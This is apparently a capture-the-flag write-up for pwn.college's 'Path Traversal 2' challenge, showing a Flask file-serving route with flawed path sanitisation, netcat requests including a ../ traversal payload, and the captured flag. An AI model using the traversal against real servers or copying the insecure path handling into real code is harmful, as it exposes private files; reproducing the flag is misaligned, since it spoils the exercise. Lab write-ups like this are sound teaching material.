# Challenge: Path Traversal 2

title: "Path Traversal 2 — Writeup"
category: "Web Exploitation"
challenge: "Path Traversal 2"
platform: "pwn.college"
difficulty: "Intermediate"
---

# Path Traversal 2 — Writeup

## 🧠 Challenge Overview

In this challenge, we are provided with a Python Flask web server which serves files from the `/challenge/files/` directory via the `/data/<path>` endpoint.

The directory structure is as follows:

```
/challenge/
├── DESCRIPTION.md
├── files/
│   ├── index.html
│   └── fortunes/
│       ├── fortune-1.txt
│       ├── fortune-2.txt
│       └── fortune-3.txt
└── server
```

## 🔍 Server Code Analysis

The vulnerable server code is as follows:

```python
@app.route("/data", methods=["GET"])
@app.route("/data/<path:path>", methods=["GET"])
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path.strip("/.")
    try:
        return open(requested_path).read()
    except PermissionError:
        flask.abort(403, requested_path)
    except FileNotFoundError:
        flask.abort(404, f"No {requested_path} from directory {os.getcwd()}")
    except Exception as e:
        flask.abort(500, requested_path + ":" + str(e))
```

The key vulnerability lies in this line:

```python
requested_path = app.root_path + "/files/" + path.strip("/.")
```

The `strip("/.")` does not properly sanitize path traversal attempts like `../../../flag`, since `strip` only removes leading and trailing characters — not sequences or intermediate components.

## 🎯 Exploitation Steps

### Step 1: Basic request
```bash
printf "GET /data HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```
Response confirms access to `index.html` and links to available fortunes.

### Step 2: Attempt to access the directory itself (Fails)
```bash
printf "GET /data/fortunes HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```
Returns `500 Internal Server Error` because the target is a directory, not a file.

### Step 3: Try Path Traversal
```bash
printf "GET /data/fortunes/../../../flag HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n" | nc challenge.localhost 80
```
✅ Returns the flag:
```
pwn.college{oDarDRBzk56F2i1vM_ERNz7PJ7U.QXyYTN2wSM0IzMyEzW}
```


## 🏁 Flag

```
pwn.college{oDarDRBzk56F2i1vM_ERNz7PJ7U.QXyYTN2wSM0IzMyEzW}
```


